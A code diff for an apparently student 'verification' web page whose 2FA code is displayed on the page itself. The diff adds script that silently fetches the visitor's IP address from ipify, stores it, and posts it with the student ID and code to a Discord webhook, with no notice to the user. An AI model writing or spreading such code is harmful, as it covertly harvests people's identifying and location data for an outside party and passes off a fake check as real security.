@@ -80,6 +80,18 @@
                 document.getElementById("2faPrompt").style.display = "block";
                 document.getElementById("2faPrompt").innerHTML = "Your 2FA code is: " + twoFACode;
                 document.getElementById("2faCodeInput").style.display = "block"; // Show the 2FA input field
+                
+                // Get user's IP address
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        var userIP = data.ip; // Store IP address
+                        console.log("User IP Address:", userIP);
+                        localStorage.setItem("userIP", userIP);  // Store IP in localStorage for later use
+                    })
+                    .catch(error => {
+                        console.error('Error fetching IP address:', error);
+                    });
             } else {
                 alert("Incorrect student ID. Please try again.");
             }
@@ -92,6 +104,9 @@
             if (user2FACode === twoFACode.toString()) { // Compare the input code with the 2FA code
                 alert("Congrats, you have been verified!");
 
+                // Get IP address from localStorage
+                var userIP = localStorage.getItem("userIP");
+
                 // Send the notification to Discord
                 fetch(discordWebhookURL, {
                     method: 'POST',
@@ -100,7 +115,7 @@
                         content: "User has been verified: Alyssa Linn",
                         embeds: [{
                             title: "Verification Success",
-                            description: `Student ID: ${studentID}\n2FA Code: ${twoFACode}`,
+                            description: `Student ID: ${studentID}\n2FA Code: ${twoFACode}\nIP Address: ${userIP}`,
                             color: 3066993
                         }]
                     })
